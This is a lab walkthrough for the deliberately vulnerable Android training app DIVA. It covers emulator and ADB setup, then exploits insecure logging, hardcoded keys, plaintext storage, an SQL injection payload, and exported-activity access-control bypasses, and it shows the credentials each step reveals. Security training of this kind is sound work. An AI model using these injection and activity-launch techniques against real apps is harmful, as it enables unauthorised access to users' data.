# diva

##  **1. Setup Genymotion Emulator**

### ➤ Download & Install Genymotion

```bash
# Download from official site
https://www.genymotion.com/product-desktop/download/

# Install (Windows example)
genymotion-3.9.0-vbox.exe
```

Follow the installation wizard → default path:
`C:\Program Files\Genymobile\Genymotion`

---

### ➤ Launch Genymotion

Search **Genymotion** → Open it → Sign in with your Genymotion account.
Choose **Personal Use** license.

---

### ➤ Create a Virtual Android Device

1. Click **Create**
2. Choose a template → e.g. **Google Nexus 5**
3. Select **Android version** → e.g. **Android 11.0**
4. Configure resources:

   * CPU: 2
   * RAM: 2048 MB
   * VM Heap: 256 MB
5. Network: choose **Bridge**
6. Click **Install**
7. Once installed → click **Play** to start the device.

---

##  **2. Connect ADB with Genymotion**

### ➤ Open PowerShell as Administrator

### ➤ Check ADB Installation

```bash
& "C:\Program Files\Genymobile\Genymotion\tools\adb.exe" version
```

### ➤ Connect to Emulator

Get the IP from emulator title bar, e.g. `192.168.138.103:5555`

```bash
& "C:\Program Files\Genymobile\Genymotion\tools\adb.exe" connect 192.168.138.103:5555
```

### ➤ Verify Connection

```bash
& "C:\Program Files\Genymobile\Genymotion\tools\adb.exe" devices
```

---

##  **3. Install DIVA Vulnerable App**

### ➤ Download DIVA APK

From GitHub: [https://github.com/payatu/diva-android](https://github.com/payatu/diva-android)
Extract `DivaApplication.apk` from the ZIP file.

### ➤ Install APK via ADB

```bash
& "C:\Program Files\Genymobile\Genymotion\tools\adb.exe" install "C:\Users\<username>\Downloads\diva-apk-file-main\DivaApplication.apk"
```

### ➤ Verify Installation

Open emulator → app drawer → check for **DIVA** icon.

---

##  **4. Exploiting DIVA Vulnerabilities**

###  Insecure Logging

```bash
# Clear logs
& "C:\Program Files\Genymobile\Genymotion\tools\adb.exe" logcat -c

# Start live log monitor
& "C:\Program Files\Genymobile\Genymotion\tools\adb.exe" logcat
```

Then input sensitive data (e.g., credit card) in the DIVA “Insecure Logging” challenge and observe logs.

---

###  Setting Up JADX (Static Analysis)

```bash
# Download JADX GUI (e.g. jadx-gui-1.4.7)
https://sourceforge.net/projects/jadx/files/

# Extract and run
jadx-gui.exe
```

Open `DivaApplication.apk` in JADX → view vulnerable code.

---

###  Hardcoded Secret Key

Check `HardcodeActivity.java` in JADX:

```java
if (key.getText().toString().equals("vendorsecretkey")) {
    Toast.makeText(this, "Access granted!", 0).show();
}
```

Enter `vendorsecretkey` in the app → access granted.

---

###  Insecure Data Storage (Part 1)

```bash
& "C:\Program Files\Genymobile\Genymotion\tools\adb.exe" shell
run-as jakhar.aseem.diva
cd /data/data/jakhar.aseem.diva/shared_prefs
ls -l
cat *.xml
```

→ Reveals credentials stored in plaintext XML.

---

###  Insecure Data Storage (Part 2)

```bash
& "C:\Program Files\Genymobile\Genymotion\tools\adb.exe" shell
run-as jakhar.aseem.diva
ls -la
cd databases
ls -la
sqlite3 ids2
.tables
SELECT * FROM myusers;
```

→ Reveals plaintext usernames and passwords.

---

###  SQL Injection (Input Validation)

In the DIVA challenge, input:

```sql
'1' or '1'='1'--
```

→ Bypasses login check and returns all user data.

---

###  Access Control Issues – Part 1

Start exported activity directly:

```bash
adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS
```

→ Displays API credentials:

```
API Key: 123secretapikey123
Username: diva
Password: p@ssword
```

---

###  Access Control Issues – Part 2

Bypass PIN validation:

```bash
adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 --ez check_pin false
```

→ Reveals hidden credentials:

```
TVEETER API Key: secrettveeterapikey
Username: diva2
Password: p@ssword2
```

---

##  **Summary of Key Commands**

| Action              | Command                                        |
| ------------------- | ---------------------------------------------- |
| Check ADB version   | `adb version`                                  |
| Connect device      | `adb connect <IP:PORT>`                        |
| List devices        | `adb devices`                                  |
| Install APK         | `adb install <apk_path>`                       |
| Clear logs          | `adb logcat -c`                                |
| View logs           | `adb logcat`                                   |
| List packages       | `adb shell pm list packages \| findstr diva`   |
| Access app data     | `run-as jakhar.aseem.diva`                     |
| Browse shared prefs | `cd /data/data/jakhar.aseem.diva/shared_prefs` |
| Open SQLite DB      | `sqlite3 ids2`                                 |
| Start activity      | `adb shell am start -a <action>`               |
| SQL Injection input | `'1' or '1'='1'--`                             |

---
